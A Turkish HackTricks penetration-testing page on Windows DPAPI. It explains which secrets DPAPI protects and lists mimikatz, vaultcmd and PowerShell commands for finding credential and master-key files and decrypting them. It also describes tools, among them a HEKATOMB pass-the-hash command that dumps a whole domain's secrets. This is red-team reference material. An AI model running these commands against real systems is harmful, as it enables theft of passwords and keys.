# DPAPI - Parolaları Çıkarma

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>ile öğrenin!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile göndererek paylaşın**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) İspanya'daki en önemli siber güvenlik etkinliği ve Avrupa'daki en önemli etkinliklerden biridir. Teknik bilginin yayılmasını amaçlayan bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}


## DPAPI Nedir

Veri Koruma API'si (DPAPI), öncelikle Windows işletim sisteminde **asimetrik özel anahtarların simetrik şifrelemesi** için kullanılır ve kullanıcı veya sistem sırlarını önemli bir entropi kaynağı olarak kullanır. Bu yaklaşım, geliştiricilerin kullanıcının oturum açma sırlarından türetilen bir anahtar kullanarak verileri şifrelemesine olanak tanıyarak, geliştiricilerin şifreleme anahtarının korunmasını kendileri yönetme ihtiyacını ortadan kaldırır.

### DPAPI ile Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunur:

- Internet Explorer ve Google Chrome'un parolaları ve otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve iç FTP hesap parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar, şifreleme anahtarları dahil
- Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için özel anahtarlar için parolalar
- Kimlik Bilgileri Yöneticisi tarafından yönetilen ağ parolaları ve Skype, MSN messenger ve daha fazlası gibi CryptProtectData kullanan uygulamalardaki kişisel veriler


## Vault Listesi
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kimlik Bilgileri Dosyaları

**Korunan kimlik bilgileri dosyaları**, aşağıdaki yerlerde bulunabilir:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Mimikatz kullanarak kimlik bilgileri bilgisini `dpapi::cred` komutunu kullanarak alabilirsiniz. Yanıtta, şifrelenmiş veri ve guidMasterKey gibi ilginç bilgiler bulabilirsiniz.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
**mimikatz modülünü** `dpapi::cred` komutuyla kullanarak uygun `/masterkey` ile şifreleri çözebilirsiniz:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Anahtarlar

Kullanıcının RSA anahtarlarını şifrelemek için kullanılan DPAPI anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizini altında saklanır, burada {SID} kullanıcının [**Güvenlik Tanımlayıcısı**](https://en.wikipedia.org/wiki/Security\_Identifier) **bulunur**. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan anahtarla aynı dosyada saklanır**. Genellikle rastgele verilerden oluşan 64 baytlık bir anahtardır. (Bu dizin korumalı olduğu için `dir` komutunu kullanarak listelenemez, ancak PS üzerinden listelenebilir).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Aşağıda bir kullanıcının bir dizi Anahtarın nasıl görüneceği gösterilmektedir:

![](<../../.gitbook/assets/image (324).png>)

Genellikle **her bir anahtar, diğer içeriği şifreleyebilen şifreli bir simetrik anahtardır**. Bu nedenle, daha sonra onunla şifrelenmiş olan diğer içeriği **şifrelemek** için **şifreli Anahtar'ın çıkarılması** ilginçtir.

### Anahtarın çıkarılması ve şifrelenmesi

Anahtarın çıkarılması ve şifrelenmesi için örnek olarak [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) bağlantısına bakın.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1), [@gentilkiwi](https://twitter.com/gentilkiwi)'nin [Mimikatz](https://github.com/gentilkiwi/mimikatz/) projesinden bazı DPAPI işlevselliğinin bir C# taşınmasıdır.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP dizininden tüm kullanıcıların ve bilgisayarların çıkarılmasını ve RPC aracılığıyla etki alanı denetleyici yedek anahtarının çıkarılmasını otomatikleştiren bir araçtır. Daha sonra betik, tüm bilgisayarların IP adreslerini çözecek ve tüm kullanıcıların DPAPI bloklarını almak ve bunları etki alanı yedek anahtarıyla her şeyi şifrelemek için tüm bilgisayarlarda smbclient gerçekleştirecektir.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP bilgisayar listesinden çıkarılanla her alt ağı bulabilirsiniz, hatta onları bilmiyorsanız bile!

"Çünkü Etki Alanı Yönetici hakları yeterli değil. Hepsi onları hackleyin."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan sırları otomatik olarak dökebilir.

## Referanslar

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/), İspanya'daki en ilgili siber güvenlik etkinliği ve Avrupa'daki en önemli etkinliklerden biridir. Teknik bilginin teşvik edilmesi misyonuyla, bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **siber güvenlik şirketinde** çalışıyor musunuz? Şirketinizi **HackTricks'te reklamını görmek** mi istiyorsunuz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** mi istiyorsunuz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile PR göndererek paylaşın.**

</details>
